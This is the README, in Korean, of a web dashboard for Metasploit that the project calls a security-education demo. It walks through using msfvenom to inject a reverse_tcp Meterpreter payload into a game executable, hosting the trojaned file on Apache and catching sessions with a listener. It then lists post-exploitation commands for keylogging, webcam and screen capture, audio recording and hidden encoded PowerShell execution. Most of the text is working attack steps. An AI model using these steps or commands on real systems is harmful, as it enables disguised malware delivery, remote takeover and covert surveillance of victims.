# Metasploit Lab — Web C2 Dashboard

보안 교육 시연용 웹 기반 Metasploit 제어 패널.  
브라우저에서 세션을 선택하고 Meterpreter 명령을 직접 입력하여 피해자 PC를 제어한다.

---

## 네트워크 구성

```
칼리 노트북 ──── 휴대폰 LTE 핫스팟 (브릿지) ──── 피해자 노트북
```

- 칼리 VM 어댑터: **브릿지** 모드
- 핫스팟 AP Isolation: **비활성화** 필요
- LHOST: 실행 시 자동 감지 (환경변수로 고정 가능)

---

## 빠른 시작

### 1. 의존성 설치 (Kali)

```bash
cd backend
pip install -r requirements.txt
```

### 2. MSF-RPC 데몬 실행

```bash
msfrpcd -P msfrpc -n -f -a 127.0.0.1 -p 55553
```

### 3. 대시보드 실행

```bash
cd backend
python app.py
# → [*] LHOST 자동 감지: 172.20.10.x:4444
```

브라우저에서 `http://<칼리IP>:5000` 접속

---

## 페이로드 준비 및 배포

### 방법 A — 대시보드에서 주입 (권장)

1. 오목.exe 빌드 (별도 작업)
2. 대시보드 **⚡ 페이로드** 탭 → `오목.exe` 업로드
3. **⚡ 주입 시작** 클릭 (msfvenom -x -k, 30~60초)
4. **⬇️ 다운로드** → `omok_patched.exe` 저장
5. 칼리에 배포:

```bash
cp omok_patched.exe /var/www/html/omok.exe
systemctl start apache2
```

### 방법 B — 수동 주입

```bash
# LHOST 자동 감지
./payload/inject.sh

# 또는 직접 지정
LHOST=172.20.10.12 ./payload/inject.sh
```

---

## 리스너 실행

```bash
./payload/ms.sh
# LHOST 자동 감지하여 msfconsole 리스너 실행
```

또는 직접:

```bash
msfrpcd -P msfrpc -n -f -a 127.0.0.1 -p 55553   # 별도 터미널
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 4444; exploit;"
```

---

## 피해자 노트북 설정

1. Windows 방화벽 전체 비활성화
2. 브라우저에서 `http://<칼리IP>/omok.exe` 다운로드
3. `omok.exe` 실행 → 대시보드에 세션 카드 자동 표시

---

## 대시보드 사용법

### 세션 선택

세션 카드를 클릭하면 이후 명령이 해당 세션으로 전송된다.

### 명령 탭

| 기능 | 방법 |
|------|------|
| 명령 실행 | 입력창에 타이핑 후 Enter |
| 히스토리 탐색 | ↑ / ↓ 방향키 |
| 빠른 입력 | 상단 버튼 클릭 → 입력창에 자동 채움 |
| 이미지 확인 | `screenshot` / `webcam_snap` 결과 자동 표시 |

**자주 쓰는 명령어:**

```
sysinfo
screenshot
webcam_snap -i 1
webcam_stream -i 1
screenshare
keyscan_start
keyscan_dump
keyscan_stop
run post/multi/gather/sound_recorder DURATION=5
ps
shell
execute -f cmd.exe -a "/c start https://example.com" -H
execute -f powershell.exe -a "-EncodedCommand <base64>" -H
upload /local/path C:\Windows\Temp\file.ext
```

### 헤더 버튼

| 버튼 | 동작 |
|------|------|
| 🛑 KILL ALL | 확인 후 전체 세션 강제 종료 |
| 🔌 PORT KILL | 칼리 로컬의 포트 4444 프로세스 강제 종료 |

---

## 환경 변수

| 변수 | 기본값 | 설명 |
|------|--------|------|
| `MSF_PASSWORD` | `msfrpc` | msfrpcd 패스워드 |
| `LHOST` | 자동 감지 | 강제 지정 시 사용 |
| `LPORT` | `4444` | Meterpreter 포트 |
| `MSF_HOST` | `127.0.0.1` | msfrpcd 주소 |
| `MSF_PORT` | `55553` | msfrpcd 포트 |

```bash
MSF_PASSWORD=mypassword LHOST=172.20.10.12 python app.py
```

---

## 시연 후 정리

```bash
# 대시보드에서 KILL ALL 후
rm -rf /tmp/demo_uploads/*
systemctl stop apache2
# msfrpcd 종료
# 피해자 노트북 재부팅 또는 스냅샷 복원
```
